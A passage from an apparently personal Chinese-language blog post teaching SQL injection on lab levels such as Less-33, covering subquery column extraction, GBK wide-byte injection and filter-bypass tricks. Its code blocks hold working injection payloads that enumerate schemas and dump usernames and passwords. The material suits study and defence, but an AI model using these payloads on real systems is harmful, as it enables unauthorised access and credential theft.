+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1, 2, 3 UNION SELECT * FROM users;</span><br></pre></td></tr></table></figure>
+
+<p>MySQL 会在内存里拼出一张“虚拟表”。因为第一句是 <code>SELECT 1, 2, 3</code>，所以这张虚拟表的表头，被硬生生改成了数字 1,2,3，第二行开始才是users表里的数据</p>
+<p>接下来是查询数据的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&#x27; union select 1,(select `2` from (select 1,2,3 union select * from users)as a limit 1,1),3 --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `2`意思是查询列名为2的数据，再用limit限制输出第几行的内容</span><br></pre></td></tr></table></figure>
+
+<p>当然我们也可以将查询的几个列合并输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&#x27; union select 1,(select concat(`2`,&#x27;~&#x27;,`3`) from (select 1,2,3 union select * from users)as a limit 1,1),3 --+</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/22/SQL/%E5%AD%90%E6%9F%A5%E8%AF%A2.png" class="" title="子查询">
+
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入通常用在使用addslashes()函数等可以对输入字符进行转义的地方，且数据库得是GBK编码</p>
+<p>以Less-33为例：</p>
+<p>当我们传入<code>/?id=1&#39;</code>时，下方的hint会告诉我们我们输入的内容变成了<code>1\&#39;</code></p>
+<p>那么我们就可以使用%df将\（URL编码为%5c）合并，变成%df%5c（解码之后为一个汉字），后面再加上 <code>&#39;</code>就可以成功绕过转义符了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?id=0%df&#x27; union select 1,(select database()),3 --+ //查数据库</span><br><span class="line">/?id=0%df&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+ //查表名</span><br><span class="line">/?id=0%df&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database()),3 --+ //查列名</span><br><span class="line">/?id=0%df&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),3 --+ //采用十六进制绕过table_name=&#x27;users&#x27;中的单引号</span><br><span class="line">/?id=0%df&#x27; union select 1,(select group_concat(username,0x7e,password) from users),3 --+ //查询指定内容</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/22/SQL/33-1.png" class="" title="33-1">
+
+<h1 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h1><ol>
+<li><p><strong>注释符过滤</strong></p>
+<p>如果不能使用–+，#，%23，那么我们可以使用闭合符将原始的闭合符给再次闭合掉，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>这样查询语句就变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>同理还有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&quot; and &quot;1&quot;=&quot;1</span><br><span class="line">/?id=1&#x27;) and (&#x27;1&#x27;)=(&#x27;1</span><br><span class="line">/?id=1&quot;) and (&quot;1&quot;)=(&quot;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>and和or过滤</strong></p>
+<ul>
+<li><p>使用大小写绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and-&gt;And or-&gt;oR</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>双写绕过（应对遇到过滤字符将其删除的情况）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and-&gt;anandd删除后变为and or-&gt;oorr删除后变为or</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用&amp;&amp;取代and，用||代替or，适用于and和or作为逻辑运算符的时候</p>
+</li>
+</ul>
+</li>
+<li><p><strong>空格过滤</strong></p>
+<ul>
+<li><p>用+代替空格 </p>
+</li>
+<li><p>用其他字符的URL编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">空格：%20</span><br><span class="line">TAB制表符：%09</span><br><span class="line">换行符(\n)：%0A</span><br><span class="line">回车符(\r)：%0D</span><br><span class="line">换页符：%0C</span><br><span class="line">垂直制表符：%0B</span><br><span class="line">不换行空格(MySQL only)：%A0</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>union和select过滤</strong></p>
+<ul>
+<li><p>大小写绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnioN SElect</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>复写单词绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uniunionon selselectect</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>尝试URL编码绕过</p>
+</li>
+<li><p>Less-28中有一种过滤相连的union select，可以用union%A0select绕过</p>
+</li>
+<li><p>使用报错注入</p>
+</li>
+</ul>
+</li>
+<li><p><strong>逗号过滤</strong></p>
+<ul>
+<li><p>使用OFFSET绕过limit的逗号：</p>
+<p>不过使用limit…offset…语法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit 返回的数量 offset 跳过的行数</span><br><span class="line">所以limit 0,1用offset表示为limit 1 offset 0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用FROM…FOR…绕过substring，mid的逗号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substring(database(),1,31) -&gt; substring(database() from 1 for 31)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用join绕过union select的逗号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3 -&gt;</span><br><span class="line">union select * from (select 1)a join (select 2)b join (select 3)c</span><br><span class="line">//创造别名分别为a,b,c的表并用join拼接</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用case when … then … else … end绕过if语句中的逗号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(1=1,sleep(3),0) -&gt;</span><br><span class="line">case when 1=1 then sleep(3) else 0 end</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>等号过滤</strong></p>
+<p>使用LIKE代替：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=1 -&gt; 1 LIKE 1</span><br></pre></td></tr></table></figure></li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ZLARYY123.github.io">ZLARYY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://zlaryy123.github.io/2026/02/22/SQL/">https://zlaryy123.github.io/2026/02/22/SQL/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avertar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">php反序列化</div></div><div class="info-2"><div class="info-item-1">php反序列化php序列化：序列化字符串：在学习反序列化之前需要了解什么是php序列化： 序列化是将对象转化为可存储或传输的字符串格式的过程。在php中，可以使用serialize()函数将对象，数组或其它数据类型序列化称为一个字符串，以便将其保存到文件或者进行网络传输。 通过以下代码，我们可以实现将一个对象序列化操作并输出序列化字符串： 12345678910111213&lt;?phpClass ZLARYY&#123;    public $xiexie = 2;    public $Chesmond  = &quot;L47yY&quot;;    public $Arach = true;    function ECH()&#123;        return &quot;ZLARYY!!!&quot;;    &#125;&#125;$ZL47yY = new ZLARYY();$serialized = serialize($ZL47yY);print_r($serialized);  注意输出序列化字符串只能使用var_dump或者print_r，不能使用e...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avertar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZLARYY</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZLARYY123"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL"><span class="toc-number">1.</span> <span class="toc-text">SQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">Union联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#extractValue"><span class="toc-number">5.1.</span> <span class="toc-text">extractValue</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#substring"><span class="toc-number">5.1.1.</span> <span class="toc-text">substring()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#limit"><span class="toc-number">5.1.2.</span> <span class="toc-text">limit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#updateXml"><span class="toc-number">5.2.</span> <span class="toc-text">updateXml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#floor"><span class="toc-number">5.3.</span> <span class="toc-text">floor</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E5%86%99%E9%A9%AC"><span class="toc-number">8.</span> <span class="toc-text">SQL写马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8into-outfile"><span class="toc-number">8.1.</span> <span class="toc-text">利用into outfile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">8.2.</span> <span class="toc-text">利用日志文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%85%A2%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2"><span class="toc-number">8.2.1.</span> <span class="toc-text">慢日志查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97"><span class="toc-number">8.2.2.</span> <span class="toc-text">全局查询日志</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">DNSlog注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POST%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">POST提交注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text">HTTP头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#UA%E6%B3%A8%E5%85%A5"><span class="toc-number">11.1.</span> <span class="toc-text">UA注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Referer%E6%B3%A8%E5%85%A5"><span class="toc-number">11.2.</span> <span class="toc-text">Referer注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">11.3.</span> <span class="toc-text">Cookie注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">13.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">14.</span> <span class="toc-text">无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#join%E3%80%81using"><span class="toc-number">14.1.</span> <span class="toc-text">join、using</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">14.2.</span> <span class="toc-text">子查询</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">15.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="toc-number">16.</span> <span class="toc-text">绕过过滤</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/22/SQL/" title="SQL">SQL</a><time datetime="2026-02-22T06:50:00.000Z" title="Created 2026-02-22 14:50:00">2026-02-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化">php反序列化</a><time datetime="2026-02-16T04:00:00.000Z" title="Created 2026-02-16 12:00:00">2026-02-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/12/SSRF/" title="SSRF">SSRF</a><time datetime="2026-02-12T07:06:00.000Z" title="Created 2026-02-12 15:06:00">2026-02-12</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By ZLARYY</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script async data-pjax src="/"></script></div></body></html>
